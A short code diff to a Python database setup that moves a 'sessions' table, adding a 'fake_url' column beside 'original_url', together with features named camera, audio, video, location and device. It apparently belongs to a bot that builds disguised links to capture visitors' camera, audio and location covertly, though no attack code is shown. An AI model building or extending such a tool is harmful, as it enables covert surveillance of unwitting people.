@@ -101,15 +101,16 @@ def init_db():
     ''')
     
     cursor.execute('''
-        CREATE TABLE IF NOT EXISTS sessions (
-            session_id TEXT PRIMARY KEY,
-            chat_id INTEGER,
-            features TEXT,
-            original_url TEXT,
-            config TEXT,
-            created TEXT
-        )
-    ''')
+    CREATE TABLE IF NOT EXISTS sessions (
+        session_id TEXT PRIMARY KEY,
+        chat_id INTEGER,
+        features TEXT,
+        original_url TEXT,
+        fake_url TEXT,
+        config TEXT,
+        created TEXT
+    )
+''')
     
     # ====== جداول النقاط اليومية والمكافآت الجماعية ======
     cursor.execute('''
@@ -150,18 +151,6 @@ def init_db():
             ('audio_duration', '30'),
             ('camera_count', '3')
     ''')
-
-    cursor.execute('''
-    CREATE TABLE IF NOT EXISTS sessions (
-        session_id TEXT PRIMARY KEY,
-        chat_id INTEGER,
-        features TEXT,
-        original_url TEXT,
-        fake_url TEXT,
-        config TEXT,
-        created TEXT
-    )
-''')
     
     features = ['camera', 'audio', 'video', 'location', 'device', 'all']
     for feature in features:
